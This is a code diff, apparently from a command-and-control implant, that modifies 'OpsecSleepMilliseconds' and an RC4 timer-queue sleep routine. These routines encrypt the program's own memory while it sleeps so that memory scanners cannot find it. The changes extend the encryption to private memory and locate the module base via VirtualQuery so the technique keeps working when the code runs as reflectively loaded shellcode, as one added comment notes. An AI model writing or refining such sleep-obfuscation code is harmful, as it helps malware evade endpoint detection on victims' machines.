@@ -119,7 +119,7 @@ static BOOL TryTimerQueueRc4Sleep(ULONG milliseconds, HMODULE imageBase, ULONG s
 		if (!ApiWin->VirtualQuery(scan, &mbi, sizeof(mbi)))
 			break;
 
-		if (mbi.Type == MEM_IMAGE && mbi.AllocationBase == imageBase &&
+		if ((mbi.Type == MEM_IMAGE || mbi.Type == MEM_PRIVATE) && mbi.AllocationBase == imageBase &&
 		    mbi.State == MEM_COMMIT && ShouldEncryptRegion(mbi.Protect)) {
 			PVOID protectBase = mbi.BaseAddress;
 			SIZE_T protectSize = mbi.RegionSize;
@@ -221,7 +221,12 @@ void OpsecSleepMilliseconds(ULONG milliseconds)
 		return;
 	}
 
-	HMODULE imageBase = ApiWin->GetModuleHandleA(NULL);
+	HMODULE imageBase = NULL;
+	MEMORY_BASIC_INFORMATION localMbi;
+	if (ApiWin->VirtualQuery((LPCVOID)OpsecSleepMilliseconds, &localMbi, sizeof(localMbi))) {
+		imageBase = (HMODULE)localMbi.AllocationBase;
+	}
+
 	if (!imageBase) {
 		ApiWin->Sleep(milliseconds);
 		return;
@@ -229,6 +234,9 @@ void OpsecSleepMilliseconds(ULONG milliseconds)
 
 	auto* dos = (PIMAGE_DOS_HEADER)imageBase;
 	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+		// If not a valid PE header, we might be running as raw shellcode without PE headers. 
+		// In this case, we can still try to encrypt the entire allocation.
+		// However, for safety, let's just proceed with standard sleep if we can't find a size.
 		ApiWin->Sleep(milliseconds);
 		return;
 	}
@@ -260,7 +268,7 @@ void OpsecSleepMilliseconds(ULONG milliseconds)
 		if (!ApiWin->VirtualQuery(scan, &mbi, sizeof(mbi)))
 			break;
 
-		if (mbi.Type == MEM_IMAGE && mbi.AllocationBase == imageBase &&
+		if ((mbi.Type == MEM_IMAGE || mbi.Type == MEM_PRIVATE) && mbi.AllocationBase == imageBase &&
 		    mbi.State == MEM_COMMIT && ShouldEncryptRegion(mbi.Protect)) {
 			PVOID protectBase = mbi.BaseAddress;
 			SIZE_T protectSize = mbi.RegionSize;
